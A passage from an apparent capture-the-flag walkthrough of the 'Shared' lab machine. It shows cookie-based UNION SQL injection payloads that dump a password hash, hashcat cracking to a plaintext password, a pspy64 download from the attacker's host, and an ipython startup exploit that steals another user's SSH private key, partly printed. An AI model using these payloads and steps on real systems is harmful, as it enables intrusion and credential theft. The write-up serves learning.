font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb4-3"></span>
<span id="cb4-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Response</span></span>
<span id="cb4-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53GG2EF8</span></span></code></pre></div>
<p>A new ID, we’re getting close to something! Note that we get the same response no matter if <code>@@version</code> is at column 1,2 or 3. Since <code>4HAR4XDK</code> is a valid ID and will therefore return true, remove it and use an invalid ID instead.</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Request</span></span>
<span id="cb5-2"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">custom_cart</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sqlihere'UNION SELECT 1,@@version,3-- -"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2E6E8GXJ"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb5-3"></span>
<span id="cb5-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Response</span></span>
<span id="cb5-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.5.15-MariaDB-0+deb11u1</span></span></code></pre></div>
<p>We got outselves a foothold!</p>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>Enumerate the database manually go gain <a href="https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635">usefull information</a>.</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## DATABSE</span></span>
<span id="cb6-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">request:</span> custom_cart=<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sqlihere'UNION SELECT 1,database(),3-- -"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2E6E8GXJ"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb6-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">response:</span> checkout</span>
<span id="cb6-4"></span>
<span id="cb6-5"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## USER</span></span>
<span id="cb6-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">request:</span> custom_cart=<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sqlihere'UNION SELECT 1,user(),3-- -"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2E6E8GXJ"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb6-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">response:</span> checkout@localhost</span>
<span id="cb6-8"></span>
<span id="cb6-9"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## TABLES</span></span>
<span id="cb6-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">request:</span> custom_cart=<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sqlihere'UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2E6E8GXJ"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb6-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">response:</span> ALL_PLUGINS,APPLICABLE_ROLES,CHARACTER_SETS,CHECK_CONSTRAINTS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENABLED_ROLES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEYWORDS,KEY_CACHES,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,SQL_FUNCTIONS,SYSTEM_VARIABLES,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,CLIENT_STATISTICS,INDEX_STATISTICS,INNODB_SYS_DATAFILES,GEOMETRY_COLUMNS,INNODB_SYS_TABLESTATS,SPATIAL_REF_SYS,INNODB_BUFFER_PAGE,INNODB_TRX,INNODB_CMP_PER_INDEX,INNODB_METRICS,INNODB_LOCK_WAITS,INNODB_CMP,THREAD_POOL_WAITS,INNODB_CMP_RESET,THREAD_POOL_QUEUES,TABLE_STATISTICS,INNODB_SYS_FIELDS,INNODB_BUFFER_PAGE_LRU,INNODB_LOCKS,INNODB_FT_INDEX_TABLE,INNODB_CMPMEM,THREAD_POOL_GROUPS,INNODB_CMP_PER_INDEX_RESET,INNODB_SYS_FOREIGN_COLS,INNODB_FT_INDEX_CACHE,INNODB_BUFFER_POOL_STATS,INNODB_FT_BEING_DELETED,INNODB_SYS_FOREIGN,INNODB_CMPMEM_RESET,INNODB_FT_DEFAULT_STOPWORD,INNODB_SYS_TABLES,INNODB_SYS_COLUMNS,INNODB_FT_CONFIG,USER_STATISTICS,INNODB_SYS_TABLESPACES,INNODB_SYS_VIRTUAL,INNODB_SYS_INDEXES,INNODB_SYS_SEMAPHORE_WAITS,INNODB_MUTEXES,user_variables,INNODB_TABLESPACES_ENCRYPTION,INNODB_FT_DELETED,THREAD_POOL_STATS,user,product</span>
<span id="cb6-12"></span>
<span id="cb6-13"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## COLUMNS</span></span>
<span id="cb6-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">request:</span> custom_cart=<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sqlihere'UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name = 'user'-- -"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2E6E8GXJ"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb6-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">response:</span> id,username,password</span>
<span id="cb6-16"></span>
<span id="cb6-17"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## EXTRACT DATA</span></span>
<span id="cb6-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">request:</span> custom_cart=<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sqlihere'UNION SELECT 1,group_concat(username,0x3a,password),3 FROM user-- -"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2E6E8GXJ"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb6-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">response:</span> james_mason:fc895d4eddc2fc12f995e18c865cf273</span></code></pre></div>
<p>Write that user + hash to file and crack with hashcat.</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  shared cat james_mason.hash                                                 </span>
<span id="cb7-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason:fc895d4eddc2fc12f995e18c865cf273</span></span>
<span id="cb7-3"></span>
<span id="cb7-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  shared hashcat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-a0</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m0</span> james_mason.hash /usr/share/wordlists/rockyou.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--user</span></span>
<span id="cb7-5"></span>
<span id="cb7-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb7-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fc895d4eddc2fc12f995e18c865cf273:Soleil101</span>                </span>
<span id="cb7-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Session..........:</span> hashcat</span>
<span id="cb7-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Status...........:</span> Cracked</span></code></pre></div>
<p>Test credentials over SSH:</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  shared ssh james_mason@shared.htb</span>
<span id="cb8-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason@shared.htb</span> password: Soleil101</span>
<span id="cb8-3"></span>
<span id="cb8-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason@shared:~$</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> user.txt</span>
<span id="cb8-5"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,1001</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb8-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">cat:</span> user.txt: No such file or directory</span></code></pre></div>
<p><code>user.txt</code> is sadly not in the possesion of james’, so it looks like we need to move laterally. From <code>id</code> we can see that james have a non-standard group <code>developer</code>, lets dig deeper into this.</p>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>In <code>/opt</code> we find the directory <code>scripts_review</code> which is empty. The directory is owned by <code>developer</code> so we can post scripts/files here, however they are deleted after a short while.</p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason@shared:/opt$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb9-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwx---</span>  2 root developer 4096 Jul 14 13:46 scripts_review</span>
<span id="cb9-3"></span>
<span id="cb9-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason@shared:/opt/scripts_review$</span> touch test</span>
<span id="cb9-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason@shared:/opt/scripts_review$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb9-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 8</span>
<span id="cb9-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwx---</span> 2 root developer 4096 Aug 25 06:53 .</span>
<span id="cb9-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 3 root root      4096 Jul 14 13:46 ..</span>
<span id="cb9-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 james_mason james_mason    0 Aug 25 06:53 test</span>
<span id="cb9-10"></span>
<span id="cb9-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason@shared:/opt/scripts_review$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb9-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 8</span>
<span id="cb9-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwx---</span> 2 root developer 4096 Aug 25 06:53 .</span>
<span id="cb9-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 3 root root      4096 Jul 14 13:46 ..</span></code></pre></div>
<p>Upload <code>pspy64</code> to see if we can make sense why the files are deleted.</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason@shared:/dev/shm$</span> wget http://10.10.14.4/pspy64</span>
<span id="cb10-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason@shared:/dev/shm$</span> chmod +x pspy64 </span>
<span id="cb10-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason@shared:/dev/shm$</span> ./pspy64</span>
<span id="cb10-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb10-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:01 CMD: UID=0    PID=6809   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/sbin/CRON</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> </span>
<span id="cb10-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:01 CMD: UID=1001 PID=6811   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> /usr/bin/pkill ipython<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">cd</span> /opt/scripts_review/ <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/local/bin/ipython</span> </span>
<span id="cb10-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:01 CMD: UID=0    PID=6813   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/sbin/CRON</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> </span>
<span id="cb10-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:01 CMD: UID=1001 PID=6812   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/bin/pkill</span> ipython </span>
<span id="cb10-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:01 CMD: UID=0    PID=6814   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/bash</span> /root/c.sh </span>
<span id="cb10-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:01 CMD: UID=0    PID=6815   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sleep</span> 5 </span>
<span id="cb10-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:01 CMD: UID=1001 PID=6816   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/bin/python3</span> /usr/local/bin/ipython </span>
<span id="cb10-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:06 CMD: UID=0    PID=6818   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">rm</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-rf</span> /opt/scripts_review/<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> </span>
<span id="cb10-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:06 CMD: UID=0    PID=6819   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/bash</span> /root/c.sh </span>
<span id="cb10-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:06 CMD: UID=0    PID=6821   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> </span>
<span id="cb10-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:06 CMD: UID=0    PID=6820   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/bash</span> /root/c.sh </span>
<span id="cb10-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:06 CMD: UID=0    PID=6822   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/bash</span> /root/c.sh </span>
<span id="cb10-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:06 CMD: UID=0    PID=6825   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s-server</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> </span>
<span id="cb10-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:06 CMD: UID=0    PID=8501   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">perl</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-ne</span> s/\(<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">\d+</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">\)/print</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">" </span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$1</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span>/ge </span>
<span id="cb10-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:06 CMD: UID=0    PID=8502   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">pidof</span> redis-server </span>
<span id="cb10-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:06 CMD: UID=0    PID=8505   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/sbin/init</span> </span></code></pre></div>
<p><strong>UID 1001</strong> (<code>dan_smith</code>) is running a job every minute where he changes into the directory <code>/opt/scripts_review</code>, and when there starts <code>ipython</code>. Reading about <code>ipython</code> we find that <a href="https://github.com/advisories/GHSA-pq7m-3gw7-gq5x">there’s a vulnerability</a> that allows users to run code as another user, if they know where (which dir) the victim starts <code>ipython</code>.</p>
<p>With this information steal dan_smith’s id_rsa</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason@shared:/opt/scripts_review$</span> mkdir <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m</span> 777 profile_default</span>
<span id="cb11-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason@shared:/opt/scripts_review$</span> mkdir <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m</span> 777 profile_default/startup</span>
<span id="cb11-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason@shared:/opt/scripts_review$</span> echo <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'import os; os.system("cp /home/dan_smith/.ssh/id_rsa /dev/shm/dan-id_rsa &amp;&amp; chmod 777 /dev/shm/dan-id_rsa")'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> profile_default/startup/exploit.py</span>
<span id="cb11-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason@shared:/opt/scripts_review$</span> chmod +x profile_default/startup/exploit.py</span>
<span id="cb11-5"></span>
<span id="cb11-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason@shared:/opt/scripts_review$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span> /dev/shm/</span>
<span id="cb11-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 3012</span>
<span id="cb11-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxrwt</span>  2 root        root             80 Aug 25 07:42 .</span>
<span id="cb11-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 17 root        root           3080 Aug 25 03:03 ..</span>
<span id="cb11-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxrwx</span>  1 dan_smith   developer      2602 Aug 25 07:47 dan-id_rsa</span>
<span id="cb11-11"></span>
<span id="cb11-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">james_mason@shared:/opt/scripts_review$</span> cat /dev/shm/dan-id_rsa </span>
<span id="cb11-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----BEGIN</span> OPENSSH PRIVATE KEY-----</span>
<span id="cb11-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span></span>
<span id="cb11-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NhAAAAAwEAAQAAAYEAvWFkzEQw9usImnZ7ZAzefm34r+54C9vbjymNl4pwxNJPaNSHbdWO</span></span>
<span id="cb11-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+/+OPh0/KiPg70GdaFWhgm8qEfFXLEXUbnSMkiB7JbC3fCfDCGUYmp9QiiQC0xiFeaSbvZ</span></span>
<span id="cb11-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">FwA4NCZouzAW1W/ZXe60LaAXVAlEIbuGOVcNrVfh+XyXDFvEyre5BWNARQSarV5CGXk6ku</span></span>
<span id="cb11-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sjib5U7vdKXASeoPSHmWzFismokfYy8Oyupd8y1WXA4jczt9qKUgBetVUDiai1ckFBePWl</span></span>
<span id="cb11-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">4G3yqQ2ghuHhDPBC+lCl3mMf1XJ7Jgm3sa+EuRPZFDCUiTCSxA8LsuYrWAwCtxJga31zWx</span></span>
<span id="cb11-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">FHAVThRwfKb4Qh2l9rXGtK6G05+DXWj+OAe/Q34gCMgFG4h3mPw7tRz2plTRBQfgLcrvVD</span></span>
<span id="cb11-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">oQtePOEc/XuVff+kQH7PU9J1c0F/hC7gbklm2bA8YTNlnCQ2Z2Z+HSzeEXD5rXtCA69F4E</span></span>
<span id="cb11-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">u1FCodLROALNPgrAM4LgMbD3xaW5BqZWrm24uP/lAAAFiPY2n2r2Np9qAAAAB3NzaC1yc2</span></span>
<span id="cb11-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">EAAAGBAL1hZMxEMPbrCJp2e2QM3n5t+K/ueAvb248pjZeKcMTST2jUh23Vjvv/jj4dPyoj</span></span>
<span id="cb11-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">4O9BnWhVoYJvKhHxVyxF1G50jJIgeyWwt3wnwwhlGJqfUIokAtMYhXmkm72RcAODQmaLsw</span></span>
<span id="cb11-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">FtVv2V3utC2gF1QJRCG7hjlXDa1X4fl8lwxbxMq3uQVjQEUEmq1eQhl5OpLrI4m+VO73Sl</span></span>
<span id="cb11-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wEnqD0h5lsxYrJqJH2MvDsrqXfMtVlwOI3M7failIAXrVVA4motXJBQXj1peBt8qkNoIbh</span></span>
<span id="cb11-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">4QzwQvpQpd5jH9VyeyYJt7GvhLkT2RQwlIkwksQPC7LmK1gMArcSYGt9c1sRRwFU4UcHym</span></span>
<span id="cb11-28"><span class="ex" style="color: null;
background-color: null;
